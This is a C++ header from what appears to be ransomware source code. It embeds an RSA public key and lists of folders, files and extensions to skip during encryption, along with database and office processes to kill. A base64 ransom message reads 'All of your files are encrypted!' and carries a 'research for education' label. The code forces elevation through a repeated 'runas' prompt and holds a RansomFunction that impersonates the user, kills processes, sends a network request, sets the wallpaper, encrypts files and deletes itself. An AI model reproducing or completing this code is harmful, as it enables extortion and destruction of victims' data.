#pragma once
#include"BranchFunction.h"
using namespace std;

vector<string> whiteFloder;
vector<string> whiteFiles;
vector<string> whiteExtension;
vector<string> blockProcess;
vector<string> domain;
string nbody;
string nname;
string Base64image;
string Base64RsaPk;
string Base64nbody;
string net;
int  RsaE;
LPCWSTR lpMutexName;
static HANDLE hMutex;


VOID JsonParse() {
	neb::CJsonObject oJson("{\"pk\": \"MFowDQYJKoZIhvcNAQEBBQADSQAwRgJBAK4OgLS9JJVwYskrRtRlZLAtm3n/KB9a7soe7YvmLag2htVYy4TWZebwuYA8/xjbmXbw6UwyWQAZV7xY/R8PSaMCARE=\" , 	\"e\": \"100001\", 	\"wht\": { 		\"fld\": [\"tor browser\", \"msocache\", \"$windows.~ws\", \"application data\", \"windows\", \"mozilla\", \"program files\", \"windows.old\", \"$windows.~bt\", \"perflogs\", \"program files (x86)\", \"programdata\", \"system volume information\", \"google\", \"$recycle.bin\", \"intel\", \"boot\", \"appdata\"], 		\"fls\": [\"ntuser.dat.log\", \"boot.ini\", \"thumbs.db\", \"autorun.inf\", \"bootsect.bak\", \"bootfont.bin\", \"desktop.ini\", \"iconcache.db\", \"ntldr\", \"ntuser.ini\", \"ntuser.dat\"], 		\"ext\": [\"cmd\", \"hta\", \"sys\", \"cab\", \"exe\", \"diagcfg\", \"shs\", \"diagcab\", \"scr\", \"themepack\", \"ps1\", \"prf\", \"nomedia\", \"mpa\", \"ldf\", \"drv\", \"msc\", \"dll\", \"msi\", \"cur\", \"icns\", \"diagpkg\", \"nls\", \"theme\", \"msstyles\", \"lnk\", \"386\", \"deskthemepack\", \"ico\", \"cpl\", \"idx\", \"bat\", \"mod\", \"lock\", \"msp\", \"spl\", \"com\", \"rom\", \"msu\", \"bin\", \"key\", \"hlp\", \"icl\", \"rtp\", \"ocx\", \"wpx\", \"ani\", \"adv\", \"ics\"] 	}, 	\"wfld\": [\"backup\"], 	\"prc\": [\"xfssvccon.exe\", \"msaccess.exe\", \"dbsnmp.exe\", \"sqbcoreservice.exe\", \"synctime.exe\", \"onenote.exe\", \"dbeng50.exe\", \"outlook.exe\", \"msftesql.exe\", \"excel.exe\", \"agntsvc.exe\", \"mysqld_opt.exe\", \"ocautoupds.exe\", \"thebat.exe\", \"sqlbrowser.exe\", \"wordpad.exe\", \"powerpnt.exe\", \"ocssd.exe\", \"sqlservr.exe\", \"winword.exe\", \"mysqld.exe\", \"thebat64.exe\", \"encsvc.exe\", \"steam.exe\", \"firefoxconfig.exe\", \"mydesktopqos.exe\", \"mspub.exe\", \"thunderbird.exe\", \"visio.exe\", \"oracle.exe\", \"mydesktopservice.exe\", \"mysqld_nt.exe\", \"infopath.exe\", \"isqlplussvc.exe\", \"sqlagent.exe\", \"ocomm.exe\", \"sqlwriter.exe\", \"tbirdconfig.exe\"], 	\"dmn\": [\"127.0.0.1\",\"192.168.139.130\"], 	\"net\": true, 	\"nbody\": \"dABoAGkAcwAgAGkAcwAgAHIAZQBhAGQAbQBlACAAZABvAGMAdQBtAGUAbgB0AAoAVQBzAGUAZAAgAGYAbwByACAAcgBlAHMAZQBhAHIAYwBoAA==\", 	\"nname\": \"please-readme.txt\", 	\"img\": \"QWxsIG9mIHlvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZCEKCkZpbmQgcGxlYXNlLXJlYWRtZS50eHQgYW5kIGZvbGxvdyBpbnN0dWN0aW9ucy4KCnJlc2VhcmNoIGZvciBlZHVjYXRpb24uIA==\" }");
	oJson.Get("pk", Base64RsaPk);
	oJson.Get("e", RsaE);
	oJson.Get("nbody", Base64nbody);
	oJson.Get("nname", nname);
	oJson.Get("img", Base64image);
	oJson.Get("net", net);
	//domain
	for (int i = 0; i < oJson["dmn"].GetArraySize(); ++i)
	{
		string strValue;
		oJson["dmn"].Get(i, strValue);
		//cout << strValue << endl;
		domain.push_back(strValue);
	}
	//whiteFloder
	for (int i = 0; i < oJson["wht"]["fld"].GetArraySize(); ++i)
	{
		string strValue;
		oJson["wht"]["fld"].Get(i, strValue);
		//cout << strValue << endl;
		whiteFloder.push_back(strValue);
	}
	//	vector<string> whiteFiles;
	for (int i = 0; i < oJson["wht"]["fls"].GetArraySize(); ++i)
	{
		string strValue;
		oJson["wht"]["fls"].Get(i, strValue);
		//cout << strValue << endl;
		whiteFiles.push_back(strValue);
	}
	//vector<string> whiteExtension;
	for (int i = 0; i < oJson["wht"]["ext"].GetArraySize(); ++i)
	{
		string strValue;
		oJson["wht"]["ext"].Get(i, strValue);
		//cout << strValue << endl;
		whiteExtension.push_back(strValue);
	}
	//vector<string> blockProcess;
	for (int i = 0; i < oJson["prc"].GetArraySize(); ++i)
	{
		string strValue;
		oJson["prc"].Get(i, strValue);
		//cout << strValue << endl;
		blockProcess.push_back(strValue);
	}
};
BOOL CallCreateMutex() {
	BOOL result = TRUE;
	lpMutexName = L"Global\\1DB960B8-E5C3-F077-5D68-EEE2E637EE0B";
	hMutex = CreateMutex(0, 0, lpMutexName);
	if (hMutex && GetLastError() == 0xB7)
		result = FALSE;
	return result;
};
VOID RunAsAdmin() {
	HANDLE hProcess = GetCurrentProcess();
	WORD wSysVerion = GetSysVersion();
	if (wSysVerion >= 0x600)
	{
		INT bValue = CallGetInformation(hProcess);          // 获得进程访问令牌
		if (bValue == 3)//特权启用默认此特权 SE_PRIVILEGE_ENABLED |　SE_PRIVILEGE_ENABLED_BY_DEFAULT
		{
			INT bValue = VerifySecurityId(hProcess);                // 验证安全标识符
			if (bValue < 0x3000)
			{
				CallReleaseMutex();
				LPCWSTR lpFilePath = CallGetFilePath();       // 获取文件路径
				if (!lpFilePath)
					ExitProcess(0);
				LPWSTR lpCommand = CallGetCommandLine();             // 获取命令参数 文件地址

				SHELLEXECUTEINFO ShExecInfo = { 0 };
				ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
				ShExecInfo.fMask = SEE_MASK_DEFAULT;
				ShExecInfo.hwnd = GetForegroundWindow();
				ShExecInfo.lpVerb = L"runas";
				ShExecInfo.lpFile = lpFilePath;
				ShExecInfo.lpParameters = lpCommand;
				ShExecInfo.lpDirectory = lpCommand;
				ShExecInfo.nShow = SW_SHOWNORMAL;
				ShExecInfo.hInstApp = NULL;
				while (!ShellExecuteExW(&ShExecInfo)) {
					;
				}
				//MessageBoxA(NULL, "管理员启动", "ok", MB_OK);
				ExitProcess(0);
			}
		}
	}
};
VOID RansomFunction() {
	SetThreadExecutionState(ES_SYSTEM_REQUIRED);

	CallImpersonateLoggedOnUser();
	InitString();
	CallCallTerminateProcess();
	RunCmd();
	SendRequest();
	SetWallpaper();
	CryptMainFunction();
	CallReverToSelf();


	DeleteMyself();
	CallReleaseMutex();

};